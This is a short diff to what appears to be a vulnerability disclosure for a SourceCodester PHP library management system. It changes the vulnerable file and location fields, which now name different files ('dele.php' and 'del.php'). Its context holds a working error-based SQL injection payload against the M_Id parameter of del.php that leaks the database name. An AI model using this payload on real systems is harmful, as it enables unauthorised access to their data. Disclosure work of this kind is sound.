@@ -4,9 +4,9 @@ vendors: https://www.sourcecodester.com/php/15434/library-management-system-qr-c
 
 The program is built using the xmapp-php8.1 version
 
-Vulnerability File: /LMS/librarian/del.php
+Vulnerability File: /LMS/librarian/dele.php
 
-Vulnerability location: /LMS/staff/del.php, M_Id
+Vulnerability location: /LMS/librarian/del.php, M_Id
 
 [+] Payload: delete=&M_Id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> M_Id
 
